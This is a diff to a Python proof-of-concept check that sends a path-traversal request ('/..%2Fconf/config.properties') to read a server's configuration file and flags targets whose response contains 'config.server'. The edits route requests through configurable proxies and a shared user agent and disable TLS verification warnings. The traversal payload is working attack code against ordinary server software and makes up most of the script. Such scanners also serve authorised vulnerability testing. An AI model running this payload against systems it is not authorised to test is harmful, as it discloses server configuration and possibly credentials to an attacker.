@@ -2,7 +2,11 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+requests.packages.urllib3.disable_warnings()
 
 # 脚本信息
 ######################################################
@@ -17,13 +21,13 @@ def poc(target):
     vuln_url = target + "/..%2Fconf/config.properties"
 
     headers = {
-        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+        "User-Agent":ua,
         "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6", 
         "Upgrade-Insecure-Requests": "1"
     }
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+
+        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
         if "config.server" in r.text and r.status_code == 200:
             result['target'] = target
             result['poc'] = NAME
@@ -31,7 +35,7 @@ def poc(target):
             return result
         else:
             pass
-    except Exception as e:
+    except:
         pass
 
 
